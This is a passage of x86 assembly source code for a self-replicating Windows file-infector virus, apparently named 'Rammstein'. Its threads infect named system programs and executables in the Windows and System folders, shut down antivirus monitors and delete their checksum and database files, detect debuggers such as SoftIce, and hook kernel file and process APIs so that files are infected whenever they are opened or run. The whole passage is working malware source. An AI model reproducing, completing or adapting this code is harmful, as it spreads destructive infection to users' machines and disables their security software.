       call [ebp+_FindFirstFileA], edi, eax        ;find file
       cmp eax, INVALID_HANDLE_VALUE               ;none?
       je next_direct                              ;
                                                   ;
       push edi                                    ;
       lea edi, [edi.WFD_cFileName]                ;
@001:  cmp [ebp+free_routine], NOT_AVAILABLE       ;
       je @001                                     ;
       mov [ebp+free_routine], NOT_AVAILABLE       ;
       call InfectFile                             ;Infect it!!
       pop edi                                     ;
       mov [ebp+free_routine], AVAILABLE           ;
                                                   ;
next_direct:                                       ;
       @endsz                                      ;go to end of string
       jmp direct_loop                             ;and do it again...
       ENDIF                                       ;
                                                   ;
direct_end:                                        ;
       lea esi, [ebp+offset direct_list]           ;point names again and
       mov ecx, direct_list_len                    ;restore encryption
       call not_list                               ;
                                                   ;
       IF THREAD1SEH                               ;
       jmp restore_thread1_seh                     ;host
                                                   ;
Thread1Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover1                          ;
DeltaRecover1:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover1               ;
                                                   ;
restore_thread1_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;release the semaphore
       call [ebp+_ExitThread], 0                   ;
Thread_1_StartAddress endp                         ;
                                                   ;
direct_list:                                       ;the direct action list
       IF DEBUG                                    ;if debug is on only
       noter <L>                                   ;
       noter <DGoat*.*>                            ;goat files will be
       ELSE                                        ;infected...
       noter <L>                                   ;
       noter <Cdplayer.exe>                        ; Like CD music?
       noter <Notepad.exe>                         ; Like to write stuff?
       noter <Wordpad.exe>                         ; Like to write better?<g>
       noter <Calc.exe>                            ; Like to calculate?
       noter <DrWatson.exe>                        ; Fear the errors?
       noter <Extrac32.exe>                        ; Like to extract?
       noter <Mplayer.exe>                         ; Like mpegs?
       noter <MsHearts.exe>                        ; Like stupid games?
       noter <WinMine.exe>                         ; And more stupid games?
       noter <Sol.exe>                             ; And still more stupid?
       noter <SndVol32.exe>                        ; Like to adjust yer vol?
       noter <WinHlp32.exe>                        ; Are you using help?
       ENDIF                                       ; Well... TO BAD !!!! ;-)
direct_list_len = $ - offset direct_list           ;
       db 0FFh                                     ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the directory infector thread
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_2_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread2Delta                          ;
@Thread2Delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset @Thread2Delta               ;
                                                   ;
       IF THREAD2SEH                               ;
       lea eax, [ebp+Thread2Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;Get the drive type. If
       call [ebp+_GetDriveTypeA]                   ;it is a fixed drive
       sub [ebp+crt_dir_flag], eax                 ;than this value = 0
                                                   ;
       push 260                                    ;Get Windows directory
       call @1                                     ;
wdir   db 260 dup(0)                               ;
@1:    call [ebp+_GetWindowsDirectoryA]            ;
                                                   ;
       push 260                                    ;Get System directory
       call @2                                     ;
sysdir db 260 dup(0)                               ;
@2:    call [ebp+_GetSystemDirectoryA]             ;
                                                   ;
       call @3                                     ;Get current directory
crtdir db 260 dup(0)                               ;
@3:    push 260                                    ;
       call [ebp+_GetCurrentDirectoryA]            ;
                                                   ;
       cmp dword ptr [ebp+crt_dir_flag], 0         ;are we on a fixed disk?
       jne direct_to_windows                       ;
                                                   ;
       mov dword ptr [ebp+infections], 0FFFFh      ;infect all files there
       call Infect_Directory                       ;
                                                   ;
direct_to_windows:                                 ;
       cmp [ebp+firstgen], 1                       ;
       je back_to_current_dir                      ;
                                                   ;
       lea eax, [ebp+offset wdir]                  ;Change to Windows dir.
       push eax                                    ;
       call [ebp+_SetCurrentDirectoryA]            ;
                                                   ;
       mov dword ptr [ebp+infections], 3           ;infect 3 files there
       call Infect_Directory                       ;
                                                   ;
       lea eax, [ebp+offset sysdir]                ;Change to System dir.
       push eax                                    ;
       call [ebp+_SetCurrentDirectoryA]            ;
                                                   ;
       mov dword ptr [ebp+infections], 3           ;infect 3 files there
       call Infect_Directory                       ;
                                                   ;
back_to_current_dir:                               ;
       lea eax, [ebp+offset crtdir]                ;Change back to crt dir.
       push eax                                    ;
       call [ebp+_SetCurrentDirectoryA]            ;
                                                   ;
       IF THREAD2SEH                               ;
       jmp restore_thread2_seh                     ;host
                                                   ;
Thread2Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover2                          ;
DeltaRecover2:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover2               ;
                                                   ;
restore_thread2_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
       call [ebp+_ExitThread], 0                   ;
infections   dd 0                                  ;
crt_dir_flag dd 3                                  ;
                                                   ;
Infect_Directory proc                              ;directory scanner
       pusha                                       ;
       lea esi, [ebp+file_extensions]              ;restore filenames
       mov ecx, file_extensions_len                ;
       call not_list                               ;
       inc esi                                     ;
       inc esi                                     ;
                                                   ;
find_first_file:                                   ;
       cmp byte ptr [esi], 0FFh                    ;last?
       je done_directory                           ;
       lea edi, [ebp+offset W32FD]                 ;find first!!
       call [ebp+_FindFirstFileA], esi, edi        ;
       mov edx, eax                                ;
                                                   ;
compare_result:                                    ;
       cmp eax, INVALID_HANDLE_VALUE               ;
       je next_extension                           ;
       or eax, eax                                 ;
       je next_extension                           ;
       push edi                                    ;
       lea edi, [edi.WFD_cFileName]                ;point name...
@002:  cmp [ebp+free_routine], NOT_AVAILABLE       ;syncronize!!!
       je @002                                     ;
       mov [ebp+free_routine], NOT_AVAILABLE       ;
       call InfectFile                             ;infect it!
       mov [ebp+free_routine], AVAILABLE           ;
       pop edi                                     ;
       jc find_next_file                           ;
       dec [ebp+infections]                        ;
       cmp [ebp+infections], 0                     ;
       jz done_directory                           ;
                                                   ;
find_next_file:                                    ;
       push edx                                    ;
       call [ebp+_FindNextFileA], edx, edi         ;find next
       pop edx                                     ;
       jmp compare_result                          ;
                                                   ;
next_extension:                                    ;
       @endsz                                      ;
       jmp find_first_file                         ;
                                                   ;
done_directory:                                    ;
       lea esi, [ebp+file_extensions]              ;recrypt the extenstions
       mov ecx, file_extensions_len                ;
       call not_list                               ;
       popa                                        ;
       ret                                         ;
Infect_Directory endp                              ;
                                                   ;
file_extensions:                                   ;the list with valid
       IF DEBUG                                    ;
       noter <L>                                   ;
       noter <GOAT*.EXE>                           ;extensions
       noter <GOAT*.COM>                           ;
       noter <GOAT*.ACM>                           ;
       noter <GOAT*.CPL>                           ;
       noter <GOAT*.HDI>                           ;
       noter <GOAT*.OCX>                           ;
       noter <GOAT*.PCI>                           ;
       noter <GOAT*.QTC>                           ;
       noter <GOAT*.SCR>                           ;
       noter <GOAT*.X32>                           ;
       noter <GOAT*.CNV>                           ;
       noter <GOAT*.FMT>                           ;
       noter <GOAT*.OCM>                           ;
       noter <GOAT*.OLB>                           ;
       noter <GOAT*.WPC>                           ;
       ELSE                                        ;extensions
       noter <L>                                   ;
       noter <*.EXE>                               ;normal exe
       noter <*.COM>                               ;same
       noter <*.ACM>                               ;
       noter <*.CPL>                               ;control panel object
       noter <*.HDI>                               ;heidi file
       noter <*.OCX>                               ;windowz ocx
       noter <*.PCI>                               ;
       noter <*.QTC>                               ;
       noter <*.SCR>                               ;screen saver
       noter <*.X32>                               ;
       noter <*.CNV>                               ;
       noter <*.FMT>                               ;
       noter <*.OCM>                               ;
       noter <*.OLB>                               ;
       noter <*.WPC>                               ;
       ENDIF                                       ;
file_extensions_len = $-offset file_extensions     ;
       db 0FFh                                     ;
Thread_2_StartAddress endp                         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the AV monitors and checksums killer thread
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_3_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread3Delta                          ;
@Thread3Delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset @Thread3Delta               ;
                                                   ;
       IF THREAD3SEH                               ;
       lea eax, [ebp+Thread3Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       IF ANTIAV                                   ;
       lea esi, [ebp+av_monitors]                  ;First kill some monitors
       mov ecx, monitors_nr                        ;
                                                   ;
LocateMonitors:                                    ;
       push ecx                                    ;
       call [ebp+_FindWindowA], 0, esi             ;
       xchg eax, ecx                               ;
       jecxz get_next_monitor                      ;
       call [ebp+_PostMessageA], ecx, WM_ENDSESSION, 0, 0
                                                   ;
get_next_monitor:                                  ;
       @endsz                                      ;
       pop ecx                                     ;
       loop LocateMonitors                         ;
                                                   ;
       lea esi, [ebp+offset av_list]               ;point av files list
       mov ecx, av_list_len                        ;and
       call not_list                               ;restore names...
       inc esi                                     ;
       inc esi                                     ;
       lea edi, [ebp+offset searchfiles]           ;point to Search Record
                                                   ;
locate_next_av:                                    ;
       mov eax, esi                                ;
       cmp byte ptr [eax], 0FFh                    ;is this the end?
       je av_kill_done                             ;
       push edi                                    ;push search rec. address
       push eax                                    ;push filename address
       call [ebp+_FindFirstFileA]                  ;find first match
       inc eax                                     ;
       jz next_av_file                             ;
       dec eax                                     ;
       push eax                                    ;
       lea ebx, [edi.WFD_cFileName]                ;ESI = ptr to filename
       push 80h                                    ;
       push ebx                                    ;
       call [ebp+_SetFileAttributesA]              ;
       push ebx                                    ;push filename address
       call [ebp+_DeleteFileA]                     ;delete file!
                                                   ;
       call [ebp+_FindClose]                       ;close the find handle
                                                   ;
next_av_file:                                      ;
       @endsz                                      ;
       jmp locate_next_av                          ;
                                                   ;
av_kill_done:                                      ;
       lea esi, [ebp+offset av_list]               ;point av files list
       mov ecx, av_list_len                        ;
       call not_list                               ;hide names...
       ENDIF                                       ;
                                                   ;
       IF THREAD3SEH                               ;
       jmp restore_thread3_seh                     ;host
                                                   ;
Thread3Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover3                          ;
DeltaRecover3:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover3               ;
                                                   ;
restore_thread3_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
       call [ebp+_ExitThread], 0                   ;
Thread_3_StartAddress endp                         ;
av_monitors label                                  ;
            db 'AVP Monitor', 0                    ;
            db 'Amon Antivirus Monitor', 0         ;
monitors_nr = 2                                    ;
                                                   ;
searchfiles WIN32_FIND_DATA <?>                    ;
                                                   ;
av_list label                                      ;
       noter <L>                                   ;
       noter <AVP.CRC>                             ;the av files to kill
       noter <IVP.NTZ>                             ;
       noter <Anti-Vir.DAT>                        ;
       noter <CHKList.MS>                          ;
       noter <CHKList.CPS>                         ;
       noter <SmartCHK.MS>                         ;
       noter <SmartCHK.CPS>                        ;
       noter <AVG.AVI>                             ;
       noter <NOD32.000>                           ;
       noter <DRWEBASE.VDB>                        ;
       noter <AGUARD.DAT>                          ;
       noter <AVGQT.DAT>                           ;
       noter <LGUARD.VPS>                          ;
av_list_len = $ - offset av_list                   ;
        db 0FFh                                    ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the anti-debugging and anti-emulation thread
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_4_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread4Delta                          ;
@Thread4Delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset @Thread4Delta               ;
                                                   ;
       IF THREAD4SEH                               ;
       lea eax, [ebp+Thread4Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       IF ANTIEMU                                  ;
       lea eax, [ebp+DebuggerKill]                 ;antidebugging stuffs.
       push eax                                    ;Here we set up a new
       xor ebx, ebx                                ;seh frame and then we
       push dword ptr fs:[ebx]                     ;make an exception error
       mov fs:[ebx], esp                           ;occur.
       dec dword ptr [ebx]                         ;TD stops here if in
                                                   ;default mode.
       jmp shut_down                               ;
                                                   ;
DebuggerKill:                                      ;
       mov esp, [esp+8]                            ;the execution goes here
       pop dword ptr fs:[0]                        ;
       add esp, 4                                  ;
                                                   ;
       db 0BDh                                     ;delta gets lost so we
delta2 dd 0                                        ;must restore it...
                                                   ;
       call @7                                     ;here we try to retrieve
       db 'IsDebuggerPresent', 0                   ;IsDebuggerPresent API
@7:    push [ebp+k32]                              ;if we fail it means we
       call [ebp+_GetProcAddress]                  ;don't have this api
       or eax, eax                                 ;(Windows95)
       jz continue_antiemu                         ;
                                                   ;
       call eax                                    ;Let's check if our
       or eax, eax                                 ;process is being
       jne shut_down                               ;debugged.
                                                   ;
       mov ecx, fs:[20h]                           ; ECX = Context of debugger
       jecxz softice                               ; If ECX<>0, we're debugged
       jmp shut_down                               ;
                                                   ;
softice:                                           ;
       lea edi, [ebp+SoftIce1]                     ;try to see if we are
       call detect_softice                         ;being debugged by
       jc shut_down                                ;softice
       lea edi, [ebp+SoftIce1]                     ;
       call detect_softice                         ;
       jc shut_down                                ;
       jmp nod_ice                                 ;
                                                   ;
detect_softice:                                    ;
       xor eax, eax                                ;
       push eax                                    ;
       push 00000080h                              ;
       push 00000003h                              ;
       push eax                                    ;
       inc eax                                     ;
       push eax                                    ;
       push 80000000h or 40000000h                 ;
       push edi                                    ;
       call [ebp+_CreateFileA]                     ;
                                                   ;
       inc eax                                     ;
       jz cantcreate                               ;
       dec eax                                     ;
                                                   ;
       push eax                                    ;
       call [ebp+_CloseHandle]                     ;
       stc                                         ;
       db 0c3h                                     ;
                                                   ;
cantcreate:                                        ;
       clc                                         ;
       db 0c3h                                     ;
                                                   ;
nod_ice:                                           ;
       cmp byte ptr [ebp+version], 4               ;can we use debug regs?
       jae cannot_kill_debug                       ;
                                                   ;
       lea esi, [ebp+drs]                          ;Debug Registers opcodes
       mov ecx, 7                                  ;7 registers
       lea edi, [ebp+bait]                         ;point the opcode place
                                                   ;
repp:                                              ;
       lodsb                                       ;take the opcode
       mov byte ptr [edi], al                      ;generate instruction
       call zapp                                   ;call it!
       loop repp                                   ;do it again
       jmp compute_now                             ;
                                                   ;
zapp:                                              ;
       xor eax, eax                                ;eax = 0
       dw 230fh                                    ;to mov DRx, eax
bait label                                         ;
       db 0                                        ;
       db 0C3h                                     ;
                                                   ;
drs db 0c0h, 0c8h, 0d0h, 0d8h, 0e8h, 0f0h, 0f8h    ;debug registers opcodes
                                                   ;
compute_now:                                       ;
       mov eax, dr0                                ;
       cmp eax, 0                                  ;
       jne shut_down                               ;
                                                   ;
cannot_kill_debug:                                 ;
       IF MMX                                      ;
       cmp [ebp+mmx], TRUE                         ;
       jne no_mmx_here                             ;
       mov ecx, 6666h                              ;do some loops
       mov eax, 1111h                              ;very lite mmx_usage
;      movd1 mm1, esi                              ;
;      movd1 eax, mm1                              ;
;      cmp eax, esi                                ;
;      jne shut_down                               ;
       ENDIF                                       ;
                                                   ;
no_mmx_here:                                       ;
       mov ebx, esp                                ;or by nod ice and
       push cs                                     ;others...
       pop eax                                     ;
       cmp esp, ebx                                ;
       jne shut_down                               ;
       jmp continue_antiemu                        ;
                                                   ;
shut_down:                                         ;
       IF DEBUG                                    ;
       call [ebp+_MessageBoxA], 0, offset debug, offset debug, 0
       ENDIF                                       ;
       push 0                                      ;If so, close down!!
       call [ebp+_ExitProcess]                     ;close
       IF DEBUG                                    ;
       debug  db 'Shut down by anti-emulator', 0   ;
       ENDIF                                       ;
continue_antiemu:                                  ;
       ELSE                                        ;
       ENDIF                                       ;
                                                   ;
       IF THREAD4SEH                               ;
       jmp restore_thread4_seh                     ;host
                                                   ;
Thread4Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover4                          ;
DeltaRecover4:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover4               ;
                                                   ;
restore_thread4_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
       call [ebp+_ExitThread], 0                   ;
                                                   ;
SoftIce1 db "\\.\SICE",0                           ;
SoftIce2 db "\\.\NTICE",0                          ;
Thread_4_StartAddress endp                         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the API hooker thread
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_5_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread5Delta                          ;
@Thread5Delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset @Thread5Delta               ;
                                                   ;
       IF THREAD5SEH                               ;
       lea eax, [ebp+Thread5Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       cmp [ebp+skipper], 1                        ;
       je error                                    ;
                                                   ;
       IF APIHOOK                                  ;
       cmp [ebp+firstgen], 1                       ;don't hook gen0
       je error                                    ;
       mov ebx, dword ptr [ebp+ourimagebase]       ; now put imagebase in ebx
       mov esi, ebx                                ;
       mov ax, word ptr [esi]                      ;
       xor ax, ''                                ;
       cmp ax, 'ZM' xor ''                       ; check if it is an EXE
       jne error                                   ;
       mov esi, dword ptr [esi.MZ_lfanew]          ; get pointer to PE
       cmp esi, 1000h                              ; too far away?
       jae error                                   ;
       add esi, ebx                                ;
       mov ax, word ptr [esi]                      ;
       xor ax, '˚'                                ;
       cmp ax, 'EP' xor '˚'                       ; is it a PE?
       jne error                                   ;
       add esi, IMAGE_FILE_HEADER_SIZE             ; skip header
       mov edi, dword ptr [esi.OH_DataDirectory.DE_Import.DD_VirtualAddress]
       add edi, ebx                                ; and get import RVA
       mov ecx, dword ptr [esi.OH_DataDirectory.DE_Import.DD_Size]
       add ecx, edi                                ; and import size
       mov eax, edi                                ; save RVA
                                                   ;
locate_module:                                     ;
       mov edi, dword ptr [edi.ID_Name]            ; get the name
       add edi, ebx                                ;
       push eax                                    ;
       mov eax, [edi]                              ;
       xor eax, '¯·˝'                             ;
       cmp eax, 'NREK' xor '¯·˝'                  ; and compare to KERN
       pop eax                                     ;
       je found_the_import_module                  ; if it is not that one
       add eax, IMAGE_IMPORT_DESCRIPTOR_SIZE       ; skip to the next desc.
       mov edi, eax                                ;
       cmp edi, ecx                                ; but not beyond the size
       jae error                                   ; of the descriptor
       jmp locate_module                           ;
                                                   ;
found_the_import_module:                           ; if we found the kernel
       mov edi, eax                                ; import descriptor
       mov esi, dword ptr [edi.ID_FirstThunk]      ; take the pointer to
       add esi, ebx                                ; addresses
       mov edi, dword ptr [edi.ID_Characteristics] ; and the pointer to
       or edi, edi                                 ; no names? ;-(
       jz error                                    ;
       add edi, ebx                                ; names
       mov edx, functions_nr                       ;
                                                   ;
hooked_api_locate_loop:                            ;
       push edi                                    ; save pointer to names
       mov edi, dword ptr [edi.TD_AddressOfData]   ; go to the actual thunk
       add edi, ebx                                ;
       add edi, 2                                  ; and skip the hint
                                                   ;
       push edi esi                                ; save these
       xchg edi, esi                               ;
       call StringCRC32                            ; eax = crc32
                                                   ;
       push edi ecx                                ;search them...
       lea edi,  [ebp+HookedFunctions]             ;
       mov ecx, functions_nr                       ;
                                                   ;
check:                                             ;
       cmp [edi], eax                              ;does it match?
       je found_it                                 ;
       add edi, 8                                  ;get next...
       loop check                                  ;
       jmp not_found                               ;
                                                   ;
found_it:                                          ;
       mov eax, [edi+4]                            ;get the new address
       mov [ebp+tempcounter], edi                  ;
       add eax, ebp                                ;and align to imagebase
       pop ecx edi                                 ;
       jmp found_one_api                           ;
                                                   ;
not_found:                                         ;
       pop ecx edi                                 ;
                                                   ;
       pop esi edi                                 ; otherwise restore
                                                   ;
       pop edi                                     ; restore arrays indexes
                                                   ;
api_next:                                          ;
       add edi, 4                                  ; and skip to next
       add esi, 4                                  ;
       cmp dword ptr [esi], 0                      ; 0? -> end of import
       je error                                    ;
       jmp hooked_api_locate_loop                  ;
                                                   ;
found_one_api:                                     ;
       pop esi                                     ; restore stack
       pop edi                                     ;
       pop edi                                     ;
                                                   ;
       pusha                                       ;
       mov edi, [ebp+tempcounter]                  ;
       mov ebx, [esi]                              ;
       lea eax, [ebp+offset HookedFunctions]       ;
       sub edi, eax                                ;
       mov ecx, 8                                  ;
       xchg eax, edi                               ;
       xor edx, edx                                ;
       div ecx                                     ;
       imul eax, eax, proc_len                     ;
       lea edi, [ebp+StartOfHooks]                 ;
       add edi, eax                                ;
       mov byte ptr [edi+5], 0E9h                  ;
       sub ebx, edi                                ;
       add ebx, 05h-0fh                            ;
       mov [edi+6], ebx                            ;
       popa                                        ;
                                                   ;
       mov [esi], eax                              ;save new api address!!!
       dec edx                                     ;did we find all?
       jz error                                    ;
       jmp api_next                                ;
       ENDIF                                       ;
                                                   ;
error:                                             ;
       mov [ebp+apihookfinish], 1                  ;
       IF THREAD5SEH                               ;
       jmp restore_thread5_seh                     ;host
                                                   ;
Thread5Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover5                          ;
DeltaRecover5:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover5               ;
                                                   ;
restore_thread5_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
       call [ebp+_ExitThread], 0                   ;
Thread_5_StartAddress endp                         ;
                                                   ;
StartOfHooks label                                 ;
Hook_CopyFileA:                                    ;Here come the hook
      call Hooker                                  ;redirectors...
      jmp [ebp+_CopyFileA]                         ;
Hook_CopyFileExA:                                  ;
      call Hooker                                  ;
      jmp [ebp+_CopyFileExA]                       ;
Hook_CreateFileA:                                  ;
      call CreateFileHooker                        ;
      jmp [ebp+_CreateFileA]                       ;
Hook_GetCompressedFileSizeA:                       ;
      call Hooker                                  ;
      jmp [ebp+_GetCompressedFileSizeA]            ;
Hook_GetFileAttributesA:                           ;
      call Hooker                                  ;
      jmp [ebp+_GetFileAttributesA]                ;
Hook_GetFileAttributesExA:                         ;
      call Hooker                                  ;
      jmp [ebp+_GetFileAttributesExA]              ;
Hook_SetFileAttributesA:                           ;
      call Hooker                                  ;
      jmp [ebp+_SetFileAttributesA]                ;
Hook_GetFullPathNameA:                             ;
      call Hooker                                  ;
      jmp [ebp+_GetFullPathNameA]                  ;
Hook_MoveFileA:                                    ;
      call Hooker                                  ;
      jmp [ebp+_MoveFileA]                         ;
Hook_MoveFileExA:                                  ;
      call Hooker                                  ;
      jmp [ebp+_MoveFileExA]                       ;
Hook_OpenFile:                                     ;
      call Hooker                                  ;
      jmp [ebp+_OpenFile]                          ;
Hook_CreateProcessA:                               ;
      call Hooker                                  ;
      jmp [ebp+_CreateProcessA]                    ;
Hook_WinExec:                                      ;
      call Hooker                                  ;
      jmp [ebp+_WinExec]                           ;
Hook_DestroyWindow:                                ;
      call ExitProcessHooker                       ;
      jmp [ebp+_DestroyWindow]                     ;
Hook_ExitProcess:                                  ;
      call ExitProcessHooker                       ;
      jmp [ebp+_ExitProcess]                       ;
proc_len = $-Hook_ExitProcess                      ;
                                                   ;
Hooker proc                                        ;And this is our hook...
      pushad                                       ;
      pushfd                                       ;
                                                   ;
      call @HookerDelta                            ;
@HookerDelta:                                      ;
      pop ebp                                      ;
      sub ebp, offset @HookerDelta                 ;
                                                   ;
       IF VIRUSNOTIFYHOOK                          ;
       pusha                                       ;
       push 0                                      ;
       call hooktext1                              ;
       db 'Rammstein viral hook code!', 0          ;
hooktext1:                                         ;
       call hooktext2                              ;
       db 'Rammstein viral hook code!', 0          ;
hooktext2:                                         ;
       push 0                                      ;
       call [ebp+_MessageBoxA]                     ;
       popa                                        ;
       ENDIF                                       ;
                                                   ;
good_to_infect:                                    ;
       mov esi, [esp+2ch]                          ;
       push esi                                    ;
       call ValidateFile                           ;first validate the file
       pop edi                                     ;
       jc no_good_file                             ;
                                                   ;
@003:  cmp [ebp+free_routine], NOT_AVAILABLE       ;
       je @003                                     ;
       mov [ebp+free_routine], NOT_AVAILABLE       ;
       call InfectFile                             ;
       mov [ebp+free_routine], AVAILABLE           ;
                                                   ;
no_good_file:                                      ;
       popfd                                       ;
       popa                                        ;
       ret                                         ;
Hooker endp                                        ;
                                                   ;
ExitProcessHooker proc                             ;
       pusha                                       ;
       call ExitHookerEbp                          ;
ExitHookerEbp:                                     ;
       pop ebp                                     ;
       sub ebp, offset ExitHookerEbp               ;
                                                   ;
       mov [ebp+process_end], 1                    ;
@fo:   cmp [ebp+fileopen], TRUE                    ;we cannot allow shutdown
       je @fo                                      ;while our thread has a
       popa                                        ;file opened...
       ret                                         ;
ExitProcessHooker endp                             ;
                                                   ;
CreateFileHooker proc                              ;
       pusha                                       ;
       pushfd                                      ;
       call CreateFileEbp                          ;
CreateFileEbp:                                     ;
       pop ebp                                     ;
       sub ebp, offset CreateFileEbp               ;
       mov eax, [esp+2ch+4+4+4+4]                  ;
       cmp eax, OPEN_EXISTING                      ;
       je good_to_infect                           ;
                                                   ;
       popfd                                       ;
       popa                                        ;
       ret                                         ;
CreateFileHooker endp                              ;
                                                   ;
HookedFunctions:                                   ;
crc32 <CopyFileA>                                  ;
      dd offset Hook_CopyFileA                     ;
crc32 <CopyFileExA>                                ;
      dd offset Hook_CopyFileExA                   ;
crc32 <CreateFileA>                                ;
      dd offset Hook_CreateFileA                   ;
crc32 <GetCompressedFileSizeA>                     ;
      dd offset Hook_GetCompressedFileSizeA        ;
crc32 <GetFileAttributesA>                         ;
      dd offset Hook_GetFileAttributesA            ;
crc32 <GetFileAttributesExA>                       ;
      dd offset Hook_GetFileAttributesExA          ;
crc32 <SetFileAttributesA>                         ;
      dd offset Hook_SetFileAttributesA            ;
crc32 <GetFullPathNameA>                           ;
      dd offset Hook_GetFullPathNameA              ;
crc32 <MoveFileA>                                  ;
      dd offset Hook_MoveFileA                     ;
crc32 <MoveFileExA>                                ;
      dd offset Hook_MoveFileExA                   ;
crc32 <OpenFile>                                   ;
      dd offset Hook_OpenFile                      ;
crc32 <CreateProcessA>                             ;
      dd offset Hook_CreateProcessA                ;
crc32 <WinExec>                                    ;
      dd offset Hook_WinExec                       ;
crc32 <XDestroyWindow>                             ;
      dd offset Hook_DestroyWindow                 ;
crc32 <ExitProcess>                                ;
      dd offset Hook_ExitProcess                   ;
functions_nr = ($-offset HookedFunctions)/8        ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the Network Infector
